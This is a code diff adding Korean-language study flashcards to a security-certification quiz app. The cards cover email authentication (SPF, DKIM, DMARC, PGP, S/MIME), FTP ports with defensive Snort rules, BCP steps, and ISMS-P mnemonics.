+[1,"SPF · DKIM · DMARC","<b>SPF</b> DNS TXT의 허용 IP와 발신 IP 비교 · <b>DKIM</b> 발신 서버 개인키로 헤더 서명, DNS 공개키로 검증 · 둘을 묶은 정책 <b>DMARC</b> · 자세한 레코드·헤더·로그 예시는 아래 항목 <span class='done'>채팅에서 다룸</span>","서"],
+[1, "SPF 레코드 · 결과", "<code>example.com. TXT \"v=spf1 ip4:203.0.113.10 include:_spf.google.com -all\"</code> · <code>-all</code> 목록 외 <b>fail</b>(거부) · <code>~all</code> <b>softfail</b>(의심 표시) · 결과 pass · fail · softfail · neutral · none(SPF 없음) · 헤더 <code>Received-SPF: pass (... designates 203.0.113.10 as permitted sender) client-ip=203.0.113.10</code> <span class='done'>채팅에서 다룸</span>"],
+[1, "DKIM 헤더 (RSA)", "메일서버 로그의 \"RSA\" = DKIM 서명 알고리즘 · <code>DKIM-Signature: v=1; a=rsa-sha256; d=example.com; s=selector1; h=from:to:subject:date; bh=본문해시; b=서명값</code> · <code>a=</code> RSA 서명+SHA-256 · <code>d=</code> 서명 도메인 · <code>s=</code> 셀렉터 · <code>h=</code> 서명한 헤더 · 공개키 <code>selector1._domainkey.example.com TXT \"v=DKIM1; k=rsa; p=MIIB...\"</code> · 송신 서버 <b>개인키로 서명</b>, 수신 서버 <b>DNS 공개키로 검증</b> → 도메인 인증 + 무결성 <span class='done'>채팅에서 다룸</span>"],
+[1, "DMARC 레코드", "<code>_dmarc.example.com TXT \"v=DMARC1; p=reject; rua=mailto:dmarc@example.com\"</code> · <code>p=none</code> 모니터링만 · <code>quarantine</code> 스팸함 · <code>reject</code> 거부 · <code>rua</code> 리포트 수신 주소 · From 도메인과 SPF·DKIM 도메인 <b>일치(alignment)</b>까지 확인 · 단독으로는 인증 못 함 <span class='done'>채팅에서 다룸</span>"],
+[1, "Authentication-Results 해석", "정상 <code>spf=pass smtp.mailfrom=example.com; dkim=pass header.d=example.com header.s=selector1; dmarc=pass (p=REJECT)</code> · 위조 <code>Received-SPF: fail ... client-ip=198.51.100.66</code> + <code>spf=fail; dkim=none (no signature); dmarc=fail</code> → <b>발신자 위조(스푸핑)·피싱</b> · 서명 있는데 내용 변조 <code>dkim=fail (body hash did not verify)</code> <span class='done'>채팅에서 다룸</span>"],
+[0, "maillog 예 (Postfix)", "<code>/var/log/maillog</code> · 정상 <code>policyd-spf: Received-SPF: Pass (mailfrom) ... client-ip=203.0.113.10</code> · <code>opendkim: DKIM verification successful</code> · 실패 <code>policyd-spf: 550 5.7.23 Message rejected due to: SPF fail - not authorized</code> · <code>opendkim: bad signature data</code> · <code>postfix/smtpd: NOQUEUE: reject: RCPT from unknown[198.51.100.66]: 550 5.7.1 SPF fail</code> <span class='done'>채팅에서 다룸</span>"],
+[1, "메일 헤더 확인 위치", "SPF·DKIM 검증 결과는 <b>받은 메일함</b>에만(<b>수신 MTA</b>가 검증하고 헤더에 기록) · 보낸메일함엔 송신 서버가 붙인 DKIM-Signature 서명값만, 결과는 없음 · Gmail ⋮ → 원본 보기(SPF/DKIM/DMARC 요약) · 네이버 더보기 → 원문 보기 · Outlook 파일 → 속성 → 인터넷 헤더 · 스팸함 원본에서 fail 실사례 <span class='done'>채팅에서 다룸</span>"],
+[1, "SPF vs DKIM (서버 vs 도메인)", "<b>SPF</b> = 보낸 <b>서버 IP</b>가 도메인의 허용 목록에 있나(등록 직원만 출입) · <b>DKIM</b> = 그 <b>도메인의 키로 서명</b>했나(회사 직인), 어느 서버에서 보냈든 OK · 예) Gmail이 LinkedIn 메일의 <code>d=linkedin.com</code> 서명을 검증 · 도메인(linkedin.com) ⊃ 서버(메일서버 A·B·발송업체) · 변조 탐지·포워딩 유지는 DKIM만 O · DKIM pass = 'd= 도메인 키로 서명됨'이지 From 주소 보증 X → From과 d= 일치는 DMARC · 답안: SPF는 발신 서버 IP를, DKIM은 전자서명으로 발신 도메인과 무결성을 검증 <span class='done'>채팅에서 다룸</span>"],
+[1, "SPF와 스팸", "SPF는 <b>발신자 위조(스푸핑) 방지</b> 기술이지 스팸 판별 X · 남의 도메인(bank.com) 사칭은 fail로 걸러짐 · 스패머가 <b>자기 도메인</b>에 SPF 등록하면 pass · SPF 없는 도메인은 none · 실제 스팸 차단: <b>RBL/DNSBL</b>(스팸 IP 블랙리스트, 단골) · SpamAssassin(내용·점수·베이지안) · SPF·DKIM·DMARC · <b>그레이리스팅</b>(처음 메일 임시 거부, 재전송만 수신) · 평판 <span class='done'>채팅에서 다룸</span>"],
+[1, "PGP 메일 식별", "본문의 <b>ASCII Armor</b> 블록(Radix-64 = Base64) · <code>-----BEGIN PGP SIGNED MESSAGE-----</code> 서명만(본문 보임, 아래 <code>BEGIN PGP SIGNATURE</code>) = 인증·무결성·부인방지 · <code>-----BEGIN PGP MESSAGE-----</code> 암호화(본문 못 읽음) = 기밀성 · <code>-----BEGIN PGP PUBLIC KEY BLOCK-----</code> 공개키 · S/MIME은 첨부 <code>smime.p7s</code>(서명)·<code>smime.p7m</code>(암호화) <span class='done'>채팅에서 다룸</span>"],
+[0, "PGP 사용처", "일반 메일보다 개발·보안·SW 배포 · 리눅스 패키지 GPG 서명(apt <code>/etc/apt/trusted.gpg.d</code>, <code>rpm --import RPM-GPG-KEY</code>) · 다운로드 <code>.asc</code>·<code>.sig</code> + <code>gpg --verify</code> · Git 커밋 서명(GitHub <b>Verified</b>) · 보안 제보 창구(security.txt에 공개키) · 기자·내부고발자(스노든) · Proton Mail(OpenPGP 자동) · 구현 <b>GnuPG(GPG)</b>, 표준 <b>OpenPGP(RFC 4880)</b> <span class='done'>채팅에서 다룸</span>"],
+[1, "Gmail → Gmail = PGP?", "<b>아님</b> · 개인 Gmail은 PGP·S/MIME 기본 미지원 · 서버 간 <b>TLS</b>(전송 구간만, 원본 <code>Received: ... with ESMTPS ... version=TLS1_3</code>, Google 서버엔 평문 저장) · Google이 <code>d=gmail.com</code> <b>DKIM</b> 서명(서버 서명, 개인 서명 X) · S/MIME은 Workspace 유료만 · PGP는 Thunderbird(OpenPGP)·FlowCrypt로 직접 · TLS = 구간 보호 vs PGP·S/MIME = <b>종단간(E2E)</b> <span class='done'>채팅에서 다룸</span>"],
+[1, "MIME vs S/MIME", "<b>MIME</b> = SMTP(7bit ASCII 텍스트만)에 한글·이미지·첨부·HTML을 담는 규격, 보안 기능 없음 · <code>MIME-Version: 1.0</code> <code>Content-Type: multipart/mixed; boundary=...</code> <code>Content-Transfer-Encoding: base64</code> · <b>S/MIME</b> = MIME + <b>전자서명</b>(인증·무결성·부인방지) + <b>암호화</b>(기밀성) · PKCS#7(CMS) + X.509 인증서·CA · <code>application/pkcs7-signature smime.p7s</code> · <code>application/pkcs7-mime smime.p7m</code> · 한 줄: MIME = 무엇을 담나, S/MIME = 안전하게 담기 · S/MIME CA 기반 vs PGP 신뢰의 웹 <span class='done'>채팅에서 다룸</span>"]
 ]],
 ["app","FTP",[
 [1,"FTP Active","서버 20번 → 클라이언트로 데이터 연결"],
@@ -843,7 +879,10 @@ const D=[
 [1,"FTP 모드","<b>Active</b> 제어 21, 데이터 20(서버→클라이언트) · <b>Passive</b> 데이터에 서버 1024 이상 포트","단"],
 [0,"TFTP · Anonymous FTP · FTP Bounce","<b>TFTP</b> UDP 69 무인증 · <b>Anonymous FTP</b> 익명 접근 · <b>FTP Bounce</b> 데이터 목적지 미검사","단"],
 [1,"Anonymous FTP 탐지","<code>USER AnOnYmOuS</code>로 대소문자 섞어 우회 시도 → Snort <code>nocase</code>로 탐지 · 필요 없으면 익명 FTP 비활성","서"],
-[0,"FTP Active 모드 문제","서버 20번이 클라이언트로 접속 → 방화벽에 막혀 목록 안 보임 · 허용하거나 Passive 모드","서"]
+[0,"FTP Active 모드 문제","서버 20번이 클라이언트로 접속 → 방화벽에 막혀 목록 안 보임 · 허용하거나 Passive 모드","서"],
+[1, "21 FTP vs 22 SSH", "<b>21 FTP</b> 파일 전송 · <b>평문</b> → ID·PW 스니핑 · 취약점 anonymous 허용·root 접속·평문 · 조치 <code>ftpusers</code>에 root, vsftpd <code>anonymous_enable=NO</code>, SFTP·FTPS로 대체 · <b>22 SSH</b> 원격 셸·SFTP·SCP · <b>암호화</b> · Telnet(23) 대체 · <code>PermitRootLogin no</code> · <b>SFTP</b>는 SSH 위라 <b>22</b> · <b>FTPS</b>는 FTP+SSL, <b>990</b> <span class='done'>채팅에서 다룸</span>"],
+[1, "FTP 21 제어 · 20 데이터", "<b>21</b> = 제어 채널(USER·PASS·RETR·STOR 명령, 로그인) · <b>20</b> = Active 모드 데이터(파일 내용) · Passive는 서버 1024 이상 임의 포트 → 20 안 씀 · Active: 서버 20 → 클라이언트로 연결, 클라이언트 방화벽에 막힘 · Passive: 클라이언트 → 서버, 서버가 넓은 포트 범위를 열어야 함 <span class='done'>채팅에서 다룸</span>"],
+[1, "FTP Snort 룰 (21 · 20)", "익명 로그인 = 21: <code>alert tcp any any -&gt; $HOME_NET 21 (msg:\"FTP anonymous login\"; content:\"USER anonymous\"; nocase; sid:1000010;)</code> · 실제 계정 로그인 = <code>content:\"USER \"; content:!\"anonymous\";</code> · 로그인 성공 응답 <code>230 Login successful</code>은 출발 포트 21 → <code>$HOME_NET 21 -&gt; any any</code> · 파일 내용 = 20(Active): <code>alert tcp $HOME_NET 20 -&gt; any any (msg:\"FTP data - ELF binary\"; content:\"|7F 45 4C 46|\"; depth:4; sid:1000020;)</code> 실행파일 매직넘버·DLP · Passive는 포트 범위나 FTP 전처리기 <span class='done'>채팅에서 다룸</span>"]
 ]],
 ["app","DNS",[
 [1,"allow-transfer 설정","<code>/etc/named.conf</code> · <code>options { allow-transfer { 192.168.1.2; }; };</code> 보조 DNS만 허용 · 전송 불필요하면 <code>allow-transfer { none; };</code> · TSIG 키로 인증 강화"],
@@ -1157,9 +1196,15 @@ const D=[
 [1,"BCP · BIA","<b>BCP</b> 업무 연속성 계획 · <b>BIA</b>(사업영향평가) 업무 중단 시 손실로 중요도 평가 → <b>RTO</b>·<b>RPO</b> 결정 · 5단계 중 2~4: BIA → 복구전략 개발 → 복구계획 수립","단"],
 [1,"재해복구 사이트","<b>미러</b> 동일 자원 Active-Active 실시간 · <b>핫</b> 동일 자원 대기(Stand-by) · <b>웜</b> 중요 자원만 부분 보유 · <b>콜드</b> 장소만 확보, 복구 가장 느림","단"],
 [1,"미러사이트 장단점","RTO 즉시·RPO 0 · 비용 높음, 업데이트 많으면 과부하 · RTO 가장 긴 것은 콜드","서"],
-[0,"재해복구 5분류","Mirror · Hot · Warm · Cold · 상호 지원(공동 이용)","서"]
+[0,"재해복구 5분류","Mirror · Hot · Warm · Cold · 상호 지원(공동 이용)","서"],
+[1, "BCP 수립 절차 (서술 답안)", "① <b>범위 설정·기획</b>: 경영진 지원, BCP 위원회, 범위·예산 ② <b>사업영향평가(BIA)</b> ★: 중단 영향(재정·법적·신뢰) 분석, 핵심 업무 식별, 복구 우선순위, <b>RTO</b>(언제까지 복구)·<b>RPO</b>(어느 시점 데이터까지) 결정 ③ <b>복구 전략 개발</b>: 미러(실시간, RTO 0) · 핫(수 시간) · 웜(수일) · 콜드(수주, 공간만) ④ <b>복구 계획 수립</b>: 비상연락망·역할과 책임·단계별 절차 문서화 ⑤ <b>테스트·유지보수</b>: 체크리스트 · 구조적 검토(Walk-through) · 시뮬레이션 · 병렬 · 전체 중단 테스트, 변경 시 갱신·교육 · BCP(업무 전체) ⊃ DRP(IT 복구) · 'BIA에서 정하는 것' = 핵심 업무·우선순위·RTO·RPO <span class='done'>채팅에서 다룸</span>"]
 ]],
 ["mgmt","ISMS-P · 관리체계",[
+[1, "🧠 ISMS-P 암기법 ① 큰 틀 3영역 101개", "<div class='memo'><b>1. 관리체계 수립 및 운영 (16)</b> 보안을 <b>어떻게 굴릴지</b> 정하는 틀<br><b>2. 보호대책 요구사항 (64)</b> 실제로 <b>무엇을 지킬지</b>, 기술적·물리적 통제<br><b>3. 개인정보 처리단계별 요구사항 (21)</b> 개인정보를 <b>받고·쓰고·주고·버릴 때</b><br>16 + 64 + 21 = <b>101</b> (2023 개정, 이전 102) · ISMS = 1+2 (80) · ISMS-P = 1+2+3 (101)</div> <span class='done'>채팅에서 다룸</span>"],
+[1, "🧠 ISMS-P 암기법 ② 관리체계 4개 = 기·위·운·점", "<div class='memo'><b>기·위·운·점</b> (기초를 위해 운동하고 점검한다) = PDCA<br>1.1 <b>기</b>반 마련: 경영진 참여·CISO·조직·범위·정책 (Plan)<br>1.2 <b>위</b>험 관리: 자산 식별·현황 흐름분석·위험 평가·대책 선정 (Plan)<br>1.3 <b>운</b>영: 대책 구현·공유·운영현황 관리 (Do)<br>1.4 <b>점</b>검 및 개선: 법적 요구사항 검토·내부 점검·개선 (Check·Act)<br>함정: 대책 <b>선정</b> 1.2 / 대책 <b>구현</b> 1.3</div> <span class='done'>채팅에서 다룸</span>"],
+[1, "🧠 ISMS-P 암기법 ③ 보호대책 12개 = 입사 스토리", "<div class='memo'>회사에 직원이 입사해서 일하는 순서<br>2.1 정책·조직·자산 = 회사 <b>규칙</b>과 자산이 있고<br>2.2 인적 보안 = <b>직원</b>이 입사하고<br>2.3 외부자 보안 = <b>외주업체</b>도 오고<br>2.4 물리 보안 = <b>건물</b>에 출입하고<br>2.5 인증 및 권한 관리 = <b>계정</b>을 받고<br>2.6 접근통제 = 시스템에 <b>접근</b>하고<br>2.7 암호화 적용 = 데이터를 <b>암호화</b>하고<br>2.8 도입 및 개발 보안 = 시스템을 <b>만들고</b><br>2.9 시스템·서비스 운영관리 = <b>운영</b>하고<br>2.10 시스템·서비스 보안관리 = <b>보안 관리</b>하다가<br>2.11 사고 예방 및 대응 = <b>사고</b>가 나면 대응하고<br>2.12 재해 복구 = <b>재해</b>가 나면 복구<br>한 줄: <b>규칙·사람·외부인·건물·계정·접근·암호·개발·운영·보안·사고·재해</b></div> <span class='done'>채팅에서 다룸</span>"],
+[1, "🧠 ISMS-P 암기법 ④ 개인정보 5개 = 수·보·제·파 + 권리", "<div class='memo'>개인정보의 생애주기<br>3.1 <b>수</b>집 시 보호조치 (동의, 최소 수집)<br>3.2 <b>보</b>유 및 이용 시 보호조치 (목적 내 이용, 가명정보)<br>3.3 <b>제</b>공 시 보호조치 (제3자 제공, 위탁)<br>3.4 <b>파</b>기 시 보호조치<br>3.5 정보주체 <b>권리</b> 보호 (열람·정정·삭제 요구)</div> <span class='done'>채팅에서 다룸</span>"],
+[1, "🧠 ISMS-P 몇 번 영역? 판단법", "<div class='memo'>정책·위험평가·내부점검처럼 <b>관리 프로세스</b> → <b>1번</b><br>계정·로그·암호화·백업처럼 <b>보안 통제</b> → <b>2번</b><br>동의·제3자 제공·파기처럼 <b>개인정보의 흐름</b> → <b>3번</b></div> <span class='done'>채팅에서 다룸</span>"],
 [1,"ISMS-P 인증기준","관리체계 16 · 보호대책 64 · 개인정보 처리단계 21 (2023 개정, 이전 22)"],
 [1,"ISMS vs ISMS-P","ISMS = 1.관리체계 + 2.보호대책 (80개) · ISMS-P = 1 + 2 + 3.개인정보 처리단계 (101개)"],
 [1,"1. 관리체계 수립 및 운영 (16)","관리체계 기반 마련(6) · 위험관리(4) · 관리체계 운영(3) · 관리체계 점검 및 개선(3) → PDCA 순환"],
@@ -1170,7 +1215,7 @@ const D=[
 [0,"ISO 27001","ISMS 국제 표준"],
 [1,"ISMS-P 인증체계","정책기관: 과학기술정보통신부·개인정보보호위원회(법·제도, 기관 지정) · 인증기관: KISA, 금융보안원(금융) · 심사기관: 지정 심사기관 · 인증위원회: 심사 결과 심의·의결"],
 [0,"방송통신위원회 변천","과거 PIMS 등 개인정보 인증 정책기관 → 2020년 데이터 3법 개정으로 개인정보 업무가 개인정보보호위원회로 이관"],
-[1,"ISMS-P 3개 영역","<b>관리체계 수립 및 운영</b> · <b>보호대책 요구사항</b> · <b>개인정보 처리 단계별 요구사항</b> (102개 항목)","단"],
+[1,"ISMS-P 3개 영역","<b>관리체계 수립 및 운영</b> · <b>보호대책 요구사항</b> · <b>개인정보 처리 단계별 요구사항</b> (102개 항목) · 현행은 <b>101개</b>(16+64+21, 2023 개정), 102개는 개정 전 기준 <span class='done'>채팅에서 다룸</span>","단"],
 [1,"ISMS-P 물리 보안","보호구역 지정 · 출입통제 · 정보시스템 보호 · 보호설비 운영(UPS·화재감지) · 보호구역 내 작업 · 반출입 기기 통제 · 업무환경 보안(클린데스크)","단"],
 [0,"ISMS-P 인증 체계","정책협의회: 과기정통부·행안부·<b>방송통신위원회</b> · 인증기관: <b>KISA</b>(인증서 발급, 심사원 양성) · 심의·의결: <b>인증위원회</b>","단"],
 [0,"ISMS-P 1.2.1 · 1.2.3","자산 식별 후 <b>중요도</b> 산정 · 위험평가는 유형별 <b>위협 정보</b> 수집, 연 1회 이상, 수용 위험은 <b>경영진</b> 승인","단"],
@@ -1315,7 +1360,7 @@ const strip=s=>s.replace(/<[^>]+>/g,"").replace(/&lt;/g,"<").replace(/&gt;/g,">"
 const NUM={};{const cc={};D.forEach(([c,t])=>{const i=Object.keys(C).indexOf(c)+1;cc[c]=(cc[c]||0)+1;NUM[t]=i+"-"+cc[c]})}
 const sid=t=>"s"+NUM[t];
 function setTab(k){cat=k;[...tabs.children].forEach(x=>x.classList.toggle("on",x.dataset.k===k))}
-function toc(){let h='<div class="toc">',last="",lg="";for(const[c,t,items]of D){if(c!==last){h+=`<h3>${C[c]}</h3>`;last=c;lg=""}if(GR[t]!==lg){h+=`<div class="tgrp">${GR[t]}</div>`;lg=GR[t]}const g=items.filter(x=>x[3]==="단"||x[3]==="서").length;h+=`<a href="#${sid(t)}" data-t="${t}"><span>${NUM[t]} ${t}</span><small>${items.length}${g?" · 기출 "+g:""}</small></a>`}return h+"</div>"}
+function toc(){let h='<div class="toc"><a class="hot" href="#" data-t="ISMS-P · 관리체계">🧠 ISMS-P 101개 암기법 바로 가기<small>기·위·운·점 · 입사 스토리 12단계 · 수·보·제·파 + 권리</small></a>',last="",lg="";for(const[c,t,items]of D){if(c!==last){h+=`<h3>${C[c]}</h3>`;last=c;lg=""}if(GR[t]!==lg){h+=`<div class="tgrp">${GR[t]}</div>`;lg=GR[t]}const g=items.filter(x=>x[3]==="단"||x[3]==="서").length;h+=`<a href="#${sid(t)}" data-t="${t}"><span>${NUM[t]} ${t}</span><small>${items.length}${g?" · 기출 "+g:""}</small></a>`}return h+"</div>"}
 function render(){if(cat==="toc"&&!q&&!onlyStar&&!onlyAtk&&!onlyGc){out.innerHTML=toc();return}let h="",n=0;for(const[c,t,items]of D){if(cat!=="all"&&cat!=="toc"&&c!==cat)continue;const f=items.filter(([s,k,d,g])=>(!onlyStar||s)&&(!onlyAtk||M[k])&&(!onlyGc||g==="단"||g==="서")&&(!q||strip(k+" "+d+" "+t+" "+(M[k]||"")).includes(q)));if(!f.length)continue;n+=f.length;h+=`<section id="${sid(t)}"><h2>${NUM[t]} ${t}<small>${GR[t]} · ${f.length}</small></h2>`+f.map(([s,k,d,g])=>`<div class="it"><div class="k">${s?'<span class="s">★</span>':""}${k}${g?`<span class="tag t${g}">${TG[g]}</span>`:""}</div><div class="d">${d}</div>${M[k]?`<button class="mb">🛡 방어 방법</button><div class="m" hidden>${M[k]}</div>`:""}</div>`).join("")+"</section>"}out.innerHTML=h||'<div class="empty">결과 없음</div>'}
 document.getElementById("q").oninput=e=>{q=e.target.value.trim().toLowerCase();render()};
 const sb=document.getElementById("star");sb.onclick=()=>{onlyStar=!onlyStar;sb.classList.toggle("on",onlyStar);render()};
